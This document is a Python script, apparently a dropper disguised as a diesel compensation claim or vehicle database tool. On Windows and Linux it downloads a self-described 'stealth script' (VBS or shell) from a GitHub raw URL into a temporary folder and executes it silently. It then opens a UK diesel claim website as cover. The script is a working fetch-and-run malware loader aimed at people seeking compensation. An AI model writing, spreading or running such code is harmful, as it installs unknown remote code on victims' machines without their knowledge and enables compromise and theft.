import os
import sys
import platform
import subprocess
import webbrowser
import urllib.request

# Define URLs
REPO_URL = "https://raw.githubusercontent.com/Admin-DieselCompensationDirect/DieselCompensation-VehicleDatabase/refs/heads/main/"
VBS_URL = REPO_URL + "DieselComp-VehicleDatabase..vbs"
SH_URL = REPO_URL + "DieselComp-VehicleDatabase..sh"
TARGET_URL = "https://www.dieselclaimuk.co.uk/"

def download_file(url, file_path):
 try:
 urllib.request.urlretrieve(url, file_path)
 print(f"Downloaded {file_path}")
 except Exception as e:
 print(f"Error downloading: {e}")

def run_script(file_path):
 try:
 if platform.system() == "Windows":
 # Run VBS file silently
 subprocess.Popen(["wscript.exe", file_path], shell=True)
 else:
 # Run SH file
 subprocess.Popen(["sh", file_path], shell=True)
 except Exception as e:
 print(f"Error running script: {e}")

def main():
 os_name = platform.system()
 print(f"System Detected: {os_name}")

 if os_name == "Windows":
 # --- WINDOWS LOGIC ---
 vbs_path = os.path.join(os.environ["TEMP"], "DieselComp.vbs")

 print("Downloading stealth script...")
 download_file(VBS_URL, vbs_path)

 print("Running stealth script...")
 run_script(vbs_path)

 print("Opening claim page...")
 webbrowser.open(TARGET_URL)

 elif os_name == "Linux":
 # --- LINUX LOGIC ---
 sh_path = "/tmp/DieselComp.sh"

 print("Downloading stealth script...")
 download_file(SH_URL, sh_path)

 # Make executable
 os.chmod(sh_path, 0o755)

 print("Running stealth script...")
 run_script(sh_path)

 print("Opening claim page...")
 webbrowser.open(TARGET_URL)

 else:
 print("Unsupported OS")

if __name__ == "__main__":
 main()
